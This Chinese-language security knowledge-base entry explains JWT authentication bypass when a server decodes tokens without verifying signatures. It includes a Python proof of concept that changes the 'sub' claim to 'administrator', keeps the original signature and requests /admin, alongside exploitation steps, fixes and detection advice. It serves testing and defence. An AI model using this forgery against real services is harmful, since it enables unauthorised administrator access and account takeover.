---
id: web-generic-jwt-unverified-signature-payload-tamper
title: 服务端完全不验证 JWT 签名时直接篡改 sub/role 提权
type: scenario
domain: web
path: web/generic/jwt
technique: jwt-unverified-signature
tags:
- jwt
- web
- auth
- signature-verification
- auth-bypass
- payload-tampering
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V22
  verified_at: '2026-11-05T03:44:22+08:00'
  notes: 已对照原文Lab1与图01-07核对：登录后 JWT 的 sub=wiener，改为 administrator 保留原签名后 GET /admin 返回200，/admin/delete?username=carlos 返回302，lab solved。原文未给组件版本，未设置 affected_versions。未复现。
url: /docs/web/generic/jwt/web-generic-jwt-unverified-signature-payload-tamper/
draft: false
kb_aliases:
- JWT 不验签
- unverified signature
- JWT 签名验证缺失
- 篡改 payload 保留原签名
- sub 改为 administrator
- JWT 认证绕过
---

## 一句话结论

服务端只解码 JWT、信任其中的 `sub`/`role` 等声明，却从不校验签名时，攻击者只需修改 Payload 并把原签名原样保留（Header 仍为 HS256、签名段非空），即可冒充管理员访问受保护接口。

## 原理

- JWT 由 `base64url(header).base64url(payload).signature` 三段组成；签名的作用是让服务端确认 Header/Payload 未被篡改。只有服务端用可信密钥重新计算并比对签名，认证才成立。
- 漏洞实现通常走以下路径之一：
  - 调用 `jwt.decode(token, options={"verify_signature": False})` 或等价参数；
  - 只用 `get_unverified_header`/`get_unverified_claims`，或手工 Base64URL 解码 JSON；
  - 自定义中间件解析 Cookie 里的 JWT 后直接取 `sub` 查用户，验证签名异常被 `try/except` 吞掉；
  - 框架默认关闭验签，开发者误以为“解出来就是可信的”。
- 与 `alg:none` 不同：本例 Header 仍是 `alg:HS256`，签名段也保留原值，攻击者没有伪造签名；漏洞点是服务端根本没有执行验签逻辑，所以签名是否匹配不影响结果。
- 由于授权通常直接读取 Payload 中的 `sub`/`role`/`uid`，篡改这些声明即可越权到任意用户（管理员）。

## 触发条件

- 应用使用 JWT 做会话/认证，但服务端未真正校验签名（或只在部分路由校验）。
- 攻击者能获得任意一个合法用户的 JWT（正常登录即可）。
- 受保护接口依据 JWT Payload 中的身份/角色字段做授权。
- Header 中的算法未被服务端强制校验也不影响本手法，因为攻击者不需要改算法。

## 利用步骤

1. 用普通账号登录，抓取 Cookie/Authorization 中的 JWT。
2. Base64URL 解码 Header、Payload，确认身份字段（如 `sub`）。
3. 把 `sub` 改为 `administrator`（或把 `role` 改为 `admin`），重新 Base64URL 编码 Payload。
4. 保持 Header 和原签名段不变，拼成新的 `header.payload.signature`。
5. 替换 Cookie/Authorization 访问 `/admin`；若返回 200 且出现管理功能，说明服务端未验签。
6. 执行管理操作（如删除用户）验证权限确实生效。

## PoC

```python
import base64, json, requests

def b64d(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

def b64e(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

token = "<登录后拿到的 JWT>"
h, p, sig = token.split(".")
payload = json.loads(b64d(p))
payload["sub"] = "administrator"          # 或 payload["role"] = "admin"

# Header 与原签名都不动，只替换 Payload
forged = f"{h}.{b64e(json.dumps(payload, separators=(',', ':')).encode())}.{sig}"

r = requests.get("http://target/admin",
                 headers={"Cookie": f"session={forged}"})
print(r.status_code, r.text)
```

```text
Burp 等价操作：在 Repeater 的 JSON Web Token 选项卡中只改 Payload 的 sub，
不要点击 Sign，直接发送；服务端仍返回 200 即证明未验签。
```

## 变体与关联

- 变体：只对部分接口关闭验签（如 `/api/*` 手工解析、静态资源不校验），需按路由逐个测试。
- 变体：服务端验签但使用硬编码/可预测密钥，属于弱密钥问题，见 [[web-generic-jwt-weak-hmac-key-bruteforce]]。
- 变体：服务端验签但完全不校验 `role` 声明，属于“签名正确、授权错误”，可结合合法账号的 claim 篡改测试。
- 关联：[[web-generic-jwt-alg-none-bypass]]（改成无签名算法绕过）、[[web-generic-jwt-rs256-hs256-confusion]]（利用算法混淆伪造签名）、[[web-generic-jwt-jwk-header-injection]]（让服务端信任令牌内嵌公钥）。
- 边界：若服务端用可信密钥正确验签，修改 Payload 会导致签名不匹配并返回 401；此时应转向密钥/算法类问题。

## 检测与防御

- 修复：所有 JWT 解码路径统一调用库的验签接口，固定算法白名单，禁止 `verify_signature=False`；不要手工解析 JWT。
- 加固：验签后再读取 claims；对 `sub`/`role` 做服务端侧用户查询与权限判断；定期轮换密钥；对验签异常返回 401 而不是放行。
- 检测：审计代码中 `verify_signature`、`get_unverified_claims`、手工 Base64 解码 JWT 的用法；测试时篡改 Payload 保留签名，观察是否仍返回 200；监控同一账号 token 的 `sub` 与请求身份不一致、管理接口异常访问。
